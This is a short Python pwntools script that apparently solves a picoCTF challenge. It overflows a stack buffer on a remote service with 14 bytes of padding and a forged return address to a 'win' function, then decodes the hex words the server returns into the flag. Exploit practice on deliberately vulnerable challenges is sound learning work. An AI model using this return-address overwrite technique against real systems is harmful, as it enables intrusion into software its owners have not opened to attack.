import re
from pwn import *

context.log_level = 'error'

def get_flag():
    try:
        r = remote('saturn.picoctf.net', 49161)
        
        win_addr = 0x08049d90
        under_construction_addr = 0x08049e10

        payload = b'A' * 14
        payload += p32(win_addr)
        payload += p32(under_construction_addr)

        r.recvuntil(b'Give me a string that gets you the flag\n')
        r.sendline(payload)
        
        output = r.recvall(timeout=5).decode(errors='ignore')
        r.close()
        
        user_info = re.search(r'User information : (.*)', output)
        names_user = re.search(r'Names of user: (.*)', output)
        age_user = re.search(r'Age of user: (.*)', output)
        
        if not (user_info and names_user and age_user):
            print("Could not parse output")
            return

        def parse_line(line):
            parts = line.split()
            res = []
            for p in parts:
                try:
                    res.append(p32(int(p, 16)))
                except:
                    pass
            return res

        ui_parts = parse_line(user_info.group(1))
        names_parts = parse_line(names_user.group(1))
        age_parts = parse_line(age_user.group(1))
        
        flag_bytes = b''
        
        # Age
        if age_parts:
            flag_bytes += age_parts[0]
            
        # Names (reverse)
        for part in reversed(names_parts):
            flag_bytes += part
            
        # User Info (reverse)
        for part in reversed(ui_parts):
            flag_bytes += part
            
        flag_str = flag_bytes.decode(errors='ignore')
        print(flag_str)
        
    except Exception as e:
        print(e)

if __name__ == "__main__":
    get_flag()
